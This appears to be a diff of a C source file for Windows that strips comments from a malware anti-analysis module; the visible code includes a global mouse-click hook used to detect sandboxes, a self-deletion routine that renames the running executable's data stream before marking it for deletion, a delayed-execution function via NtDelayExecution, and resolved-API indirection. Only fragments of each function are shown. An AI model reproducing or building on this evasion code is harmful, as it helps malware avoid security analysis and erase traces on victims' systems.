@@ -1,11 +1,3 @@
-/*
-	this file contains all the anti-analysis techniques used:
-		- MouseClicksLogger
-		- DeleteSelf
-		- DelayExecutionVia_NtDE
-
-	All combined to 'AntiAnalysis' function
-*/
 
 #include <Windows.h>
 
@@ -23,16 +15,8 @@ HHOOK g_hMouseHook = NULL;
 // global mouse clicks counter
 DWORD g_dwMouseClicks = NULL;
 
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-
-
 // the callback function that will be executed whenever the user clicked a mouse button
 LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {
-
-    // WM_RBUTTONDOWN :         "Right Mouse Click"
-    // WM_LBUTTONDOWN :         "Left Mouse Click"
-    // WM_MBUTTONDOWN :         "Middle Mouse Click"
 
     if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
 #ifdef DEBUG
@@ -71,11 +55,6 @@ BOOL MouseClicksLogger() {
     return TRUE;
 }
 
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-
-
-
 BOOL DeleteSelf() {
 
 
@@ -99,7 +78,6 @@ BOOL DeleteSelf() {
 	ZeroMemory(szPath, sizeof(szPath));
 	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
 
-	//--------------------------------------------------------------------------------------------------------------------------
 	// marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
 	Delete.DeleteFile = TRUE;
 
@@ -107,7 +85,6 @@ BOOL DeleteSelf() {
 	pRename->FileNameLength = sizeof(NewStream);
 	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
 
-	//--------------------------------------------------------------------------------------------------------------------------
 
 	// used to get the current file name
 	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
@@ -116,9 +93,6 @@ BOOL DeleteSelf() {
 #endif // DEBUG
 		return FALSE;
 	}
-
-	//--------------------------------------------------------------------------------------------------------------------------
-	// RENAMING
 
 	// openning a handle to the current file
 	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
@@ -146,8 +120,6 @@ BOOL DeleteSelf() {
 
 	g_Api.pCloseHandle(hFile);
 
-	//--------------------------------------------------------------------------------------------------------------------------
-	// DELEING
 
 	// openning a new handle to the current file
 	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
@@ -179,16 +151,11 @@ BOOL DeleteSelf() {
 
 	g_Api.pCloseHandle(hFile);
 
-	//--------------------------------------------------------------------------------------------------------------------------
-
 	// freeing the allocated buffer
 	HeapFree(GetProcessHeap(), 0, pRename);
 
 	return TRUE;
 }
-
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-//------------------------------------------------------------------------------------------------------------------------------------------------//
 
 
 BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
@@ -233,11 +200,6 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 
 	return TRUE;
 }
-
-
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-//------------------------------------------------------------------------------------------------------------------------------------------------//
-
 
 BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 
